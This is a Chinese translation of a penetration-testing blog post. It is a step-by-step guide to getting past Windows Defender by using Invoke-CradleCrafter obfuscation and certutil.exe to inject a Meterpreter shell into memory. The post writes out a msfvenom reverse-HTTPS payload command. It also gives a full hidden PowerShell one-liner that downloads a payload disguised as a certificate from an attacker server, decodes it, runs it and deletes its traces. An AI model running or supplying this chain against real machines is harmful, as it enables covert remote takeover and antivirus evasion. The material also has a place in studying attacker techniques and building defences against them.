> 原文链接: https://www.anquanke.com//post/id/146969 


# 看我如何使用CertUtil.exe进行内存注入攻击


                                阅读量   
                                **199531**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：https://www.coalfire.com/
                                <br>原文地址：[https://www.coalfire.com/The-Coalfire-Blog/May-2018/PowerShell-In-Memory-Injection-Using-CertUtil-exe](https://www.coalfire.com/The-Coalfire-Blog/May-2018/PowerShell-In-Memory-Injection-Using-CertUtil-exe)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t016c4934d124428dd9.jpg)](https://p2.ssl.qhimg.com/t016c4934d124428dd9.jpg)

## 

## 写在前面的话

你有没有听过那句老话：“生命中唯一不变的就是改变？”在渗透测试和信息安全领域，也是如此。新的防守总是不断涌现。最近我正忙于内部事务，另一项工作也在进行中，这时我发现微软升级了Windows Defender，它几乎出现在我们最近遇到的每一个微软操作系统上。我感到有点绝望。几年来，我使用带有`Invoke-Shellcode`的PowerShell来轻松地控制shell，但现在这些方法都凉了。

但并不是彻底凉了。最近我一直在做一些研究和准备，我将在今年晚些时候在Black Hat上介绍代码注入技术。我阅读了Microsoft有关`Certutil.exe`与PowerShell一起在多个博客网站上执行内存注入的文章。最后，我将推荐Daniel Bohannon编写的PowerShell模块[Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)。由于我已经使用了[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)，所以向`Invoke-CradleCrafter`的过渡非常轻松。

在这篇博客文章中，我将讨论使用`PowerShell`，`Invoke-CradleCrafter`和`Microsof`t的`Certutil.exe`来制作payload和可用于逃避最新版本的Windows Defender（截至撰写本文时）的单行程序的步骤，以及作为不被入侵检测系统和行为分析所捕获的技巧。毕竟，PowerShell仍然是最简单和最好的方法之一，但与此同时，它也在出卖你，因为它一运行就与AMSI进行交流，这使得事情有点具有挑战性。

## 

## 开始

设置要求： Linux，Metasploit，Invoke-CradleCrafter，PowerShell for Linux和Windows 10.<br>
安装[PowerShell for Linux](https://github.com/PowerShell/PowerShell)和[Metasploit](https://github.com/rapid7/metasploit-framework)。

我会告诉你我更喜欢在Linux上运行PowerShell，所以Defender不会出问题。从[GitHub](https://github.com/danielbohannon/Invoke-CradleCrafter.git)下载`Invoke-CradleCrafter`。

接下来，我们将通过执行以下操作来创建base64编码的PowerShell Meterpreter payload：<br>`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;YOUR IP HERE&gt; LPORT=443 -e cmd/powershell_base64 -f psh -o load.txt`

[![](https://p5.ssl.qhimg.com/t01dacb935b51c2ca34.jpg)](https://p5.ssl.qhimg.com/t01dacb935b51c2ca34.jpg)

请注意，只要`certutil`可以获取并读取其内容，有效内容文件的扩展名就可以是任何内容。例如，一个组织可能有一个不允许下载脚本的策略（或IDS，内容过滤器等），但它们可能允许`.txt`文件或甚至其他异常扩展的文件。如果你要改变它，只要确保你在`Invoke-CradleCrafter`（见下文）中设置URL时补偿了这一点。

接下来，您将创建一个用于提供Web内容的文件夹。在这个例子中，我们将调用我们的文件夹payload将`PowerShell Meterpreter PowerShell`脚本放置在此文件夹内。

接下来，我们将使用`Invoke-CradleCrafter`来混淆我们的`certutil`和PowerShell命令，这些命令将用于绕过Defender执行内存中注入。

通过输入`pwsh`或PowerShell，进入Linux主机的PowerShell提示。进入`Invoke-CradleCrafter`目录并运行以下命令：<br>`Import-Module .Invoke-CradleCrafter.psd1; Invoke-CradleCrafter`<br>
在提示符下键入： `SET URL http(s)://&lt;YOUR IP&gt;/load.txt`，或者您可以使用其他扩展名等。

[![](https://p1.ssl.qhimg.com/t01995571036e5bd490.jpg)](https://p1.ssl.qhimg.com/t01995571036e5bd490.jpg)<br>
下一步输入`MEMORY`然后`CERTUTIL`：

[![](https://p2.ssl.qhimg.com/t01f5f50b414177bb00.jpg)](https://p2.ssl.qhimg.com/t01f5f50b414177bb00.jpg)



[![](https://p4.ssl.qhimg.com/t01ef5aa04744c0c3e3.jpg)](https://p4.ssl.qhimg.com/t01ef5aa04744c0c3e3.jpg)

接下来，您将看到您的混淆选项。我通常选择全部，然后输入1

[![](https://p0.ssl.qhimg.com/t01cebc41ccf695fe1b.jpg)](https://p0.ssl.qhimg.com/t01cebc41ccf695fe1b.jpg)

获得结果后，将其放在Windows机器上的一个名为`raw.txt`的文件中。你可以使用`certutil`对这个文件进行base64编码，并创建名为`cert.cer`的文件并将其放置在Web服务器上。然后，我们将构建一个将被远程调用的单行程序，用于将该文件下载并在目标上执行。一旦执行，它将调用我们的`paylaod load.txt`并通过PowerShell注入Meterpreter到内存中。

使用`certutil`来编码`raw.txt`文件：

[![](https://p1.ssl.qhimg.com/t016425fa4a53e2e1a3.jpg)](https://p1.ssl.qhimg.com/t016425fa4a53e2e1a3.jpg)<br>
看起来像一个真正的证书，不是吗？

[![](https://p1.ssl.qhimg.com/t0170e999168c3fae57.jpg)](https://p1.ssl.qhimg.com/t0170e999168c3fae57.jpg)<br>
将您的`cert.cer`放在您要提供内容的paylaod目录中,然后，我们将构建我们的单行程序，它可以放在批处理文件中，或者使用命令行比如[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)等强大的工具来执行。

<a class="reference-link" name="One-liner:"></a>**One-liner:**

`powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%cert.cer (New-Object Net.WebClient).DownloadString('http://YOUR IP HERE/cert.cer'); certutil -decode %APPDATA%cert.cer %APPDATA%stage.ps1 &amp; start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%stage.ps1 &amp; start /b cmd /c del %APPDATA%cert.cer`

一旦你设置好了所有的东西，并且你的web服务器启动了内容服务的地方，你可以运行上面的命令，你应该得到一个Meterpreter shell：

[![](https://p4.ssl.qhimg.com/t019403d5c71be766dd.jpg)](https://p4.ssl.qhimg.com/t019403d5c71be766dd.jpg)

您的网络服务器应该获得2次点击：

[![](https://p5.ssl.qhimg.com/t01bdc7f37e6a353850.jpg)](https://p5.ssl.qhimg.com/t01bdc7f37e6a353850.jpg)

Defender被成功绕过并建立了一个Meterpreter会话：

[![](https://p0.ssl.qhimg.com/t013c57a39c754015c4.jpg)](https://p0.ssl.qhimg.com/t013c57a39c754015c4.jpg)<br>
请注意，要使此攻击成功，需要手动删除执行的Meterpreter PowerShell脚本。`cert.ce`r文件将自动被删除，但您需要在Meterpreter会话中删除`stage.ps1`通过以下操作:

[![](https://p4.ssl.qhimg.com/t0112b2816dab35e6ca.jpg)](https://p4.ssl.qhimg.com/t0112b2816dab35e6ca.jpg)

另外请注意，您也可以从您可能通过其他方式获得的命令shell中下载到PowerShell，并复制`stage.ps1`文件的内容以直接执行您的有效内容，如下所示：

[![](https://p4.ssl.qhimg.com/t0156b199b6a7b734fb.jpg)](https://p4.ssl.qhimg.com/t0156b199b6a7b734fb.jpg)

## 

## 最后的教导

最后，我想起了改变是多么的美好。强迫你去研究和尝试新技术，这种变化不仅可以帮助你成长为优秀渗透测试者，还可以帮助你成为更好的顾问并教育顾客如何更好地装备并调整他们的防御以检测这些高级攻击。
